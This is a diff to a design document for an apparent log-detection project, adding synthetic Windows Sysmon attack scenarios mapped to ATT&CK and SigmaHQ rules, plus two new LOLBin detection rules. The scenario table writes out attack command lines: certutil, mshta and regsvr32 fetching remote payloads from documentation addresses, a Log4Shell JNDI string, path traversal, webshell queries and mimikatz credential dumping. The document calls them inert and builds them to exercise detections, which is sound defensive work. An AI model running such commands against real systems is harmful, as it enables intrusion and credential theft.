@@ -327,7 +327,7 @@ Combined format: `$remote_addr - $remote_user [$time_local] "$request" $status $
 
 ### 4.3 Demo data scenarios (`packages/loggen`)
 
-Company: "Andes Retail". Hosts: `bastion-01` (SSH jump host), `web-01`, `web-02` (nginx), `db-01`. IP plan: attackers from documentation ranges `192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24`; customers from the benchmarking range `198.18.0.0/15`; office and servers in `10.20.0.0/16`. No real people, domains or public addresses.
+Company: "Andes Retail". Hosts: `bastion-01` (SSH jump host), `web-01`, `web-02` (nginx), `db-01`, and the Windows workstations `ws-0142` and `ws-0187` with Sysmon (S5, `samples/<host>/sysmon.jsonl`). IP plan: attackers from documentation ranges `192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24`; customers from the benchmarking range `198.18.0.0/15`; office and servers in `10.20.0.0/16`. No real people, domains or public addresses.
 
 | Id | Host | What happens | ATT&CK | Expected detections |
 | --- | --- | --- | --- | --- |
@@ -342,6 +342,16 @@ Company: "Andes Retail". Hosts: `bastion-01` (SSH jump host), `web-01`, `web-02`
 | `path-traversal` | web-02 | `GET /download?file=../../../../etc/passwd` and `GET /download?file=..%252f..%252f..%252fetc%252fpasswd`; the rule reads only `cs-uri-query`, so the traversal must be in the query string | T1190 | SigmaHQ `web_path_traversal_exploitation_attempt.yml` |
 | `log4shell-probe` | web-02 | user agent `${jndi:ldap://203.0.113.99:1389/Basic/Command/Base64/aWQ=}`; the rule matches JNDI-Exploit-Kit paths such as `/Basic/Command/Base64/`. Keep it out of the query string, where `=${` would also fire `web_ssti_in_access_logs.yml` | T1190 | SigmaHQ `web_jndi_exploit.yml` |
 | `webshell` | web-01 | `GET /uploads/img.php?cmd=whoami`, then `GET /uploads/img.php?cmd=net+user` | T1505.003 | SigmaHQ `web_win_webshells_in_access_logs.yml` |
+| `office-macro-powershell` | ws-0142 | Word opens a macro document from Downloads and starts `powershell.exe` | T1566.001, T1204.002, T1059.001 | SigmaHQ `proc_creation_win_office_susp_child_processes.yml` |
+| `encoded-powershell` | ws-0142 | that PowerShell starts `powershell.exe -EncodedCommand <base64 of a Write-Output line>` | T1059.001, T1027 | SigmaHQ `proc_creation_win_powershell_encode.yml` |
+| `certutil-download` | ws-0142 | `certutil.exe -urlcache -split -f http://203.0.113.50/inventario.txt ...`, its connection (event 3) and the file it writes (event 11) | T1105 | SigmaHQ `proc_creation_win_certutil_download.yml`, `proc_creation_win_certutil_download_direct_ip.yml`; `centinela-win-lolbin-network-connection`, `centinela-win-lolbin-file-drop` |
+| `scheduled-task` | ws-0142 | `schtasks.exe /Create ... /TR "notepad.exe C:\Users\Public\Downloads\inventario.txt"` | T1053.005 | SigmaHQ `proc_creation_win_schtasks_creation.yml`, `proc_creation_win_schtasks_env_folder.yml` |
+| `mshta-remote-hta` | ws-0187 | `mshta.exe http://203.0.113.60/aviso-pago.hta` and its connection | T1218.005 | SigmaHQ `proc_creation_win_mshta_http.yml`; `centinela-win-lolbin-network-connection` |
+| `regsvr32-scriptlet` | ws-0187 | `regsvr32.exe /s /n /u /i:http://203.0.113.60/demo.sct scrobj.dll` | T1218.010 | SigmaHQ `proc_creation_win_regsvr32_network_pattern.yml` |
+| `rundll32-proxy` | ws-0187 | `rundll32.exe C:\Users\Public\Downloads\aviso.dat,DllRegisterServer` | T1218.011 | SigmaHQ `proc_creation_win_rundll32_uncommon_dll_extension.yml` |
+| `credential-dumping` | ws-0187 | an elevated `cmd.exe` runs `mk.exe "privilege::debug" "sekurlsa::logonpasswords" exit` | T1003.001 | SigmaHQ `proc_creation_win_hktl_mimikatz_command_line.yml` |
+
+Windows command lines only need to satisfy their rules and are inert (documentation addresses, a harmless encoded command, no real tool). Windows background traffic (service-host housekeeping all day; Outlook, Chrome, documents, proxy and mail connections and downloads on working days) must not trigger any rule at any level.
 
 Background traffic must not trigger `high`/`critical` alerts: admins logging in with public keys from the office range, at most two consecutive password typos by staff, cron sessions every 5 minutes, routine sudo (`apt`, `systemctl`, `journalctl`), logind sessions, customer browsing (`/`, `/products/*`, `/cart`, static assets), search engine bots, a few 404s (`/favicon.ico`, an occasional `/wp-login.php`).
 
@@ -376,6 +386,8 @@ JSON lines in either shape:
 - flat: `{"EventID": 1, "Computer": "WS-0142", "UtcTime": "...", "Image": "...", ...}`.
 
 `EventData` keys become Sigma fields unchanged. Event ID 1 → `process_start` (category `process`), 3 → `network_connection` (`network`), 11 → `file_create` (`file`). Others → `other`.
+
+Parser details (S5, `docs/decisions/S5.md`): `EventID` and `Computer` are added as fields; keys that are not Windows field names (`^[A-Za-z][A-Za-z0-9_]{0,127}$`) are left out of `fields`; time is `UtcTime`, else `SystemTime` / `TimeCreated`, read as UTC; `host` is `Computer`; `User` (`DOMAIN\name`) gives `user` = name and `user.domain`; `srcIp`/`srcPort` come from `SourceIp`/`SourcePort` for event 3 only, the remote end goes to `destination.ip`/`destination.port`; ECS-style `process.*` and `file.*` keys are added; an event from another provider or channel becomes `other`.
 
 The SigmaHQ regression samples are not JSON lines: each file is pretty-printed JSON, and 5 of the 267 files hold several objects back to back, so read them with a streaming JSON decoder. A sample file is named `<rule id>.json` and sits in a folder named after the rule file (without `.yml`); `info.yml` lists the rule under `rule_metadata`.
 
@@ -521,6 +533,8 @@ Base rules (`rules/centinela/`, Sigma format, ECS-style fields from §3.1):
 | `centinela-user-created` | `product: linux`, `service: auth` | `event.action: user_created` | low | privileged-account-created (also alerts) |
 | `centinela-user-added-to-privileged-group` | `product: linux`, `service: auth` | `event.action: user_added_to_group` and `group.name` in `sudo`, `wheel`, `adm`, `root` | medium | privileged-account-created (also alerts) |
 | `centinela-web-not-found` | `category: webserver` | `http.response.status_code: 404` | informational | web-scanning-burst (building block) |
+| `centinela-win-lolbin-network-connection` | `product: windows`, `category: network_connection` | `Image` ends with `\certutil.exe`, `\bitsadmin.exe`, `\mshta.exe` or `\regsvr32.exe`, `Initiated: 'true'`, `DestinationIp` outside private, loopback, link-local and unique-local ranges (S5) | medium | alerts on its own |
+| `centinela-win-lolbin-file-drop` | `product: windows`, `category: file_event` | the same `Image` list, `TargetFilename` not in `\CryptnetUrlCache\` or `\INetCache\` (S5) | medium | alerts on its own |
 
 Correlation rules (`rules/correlation/`):
 
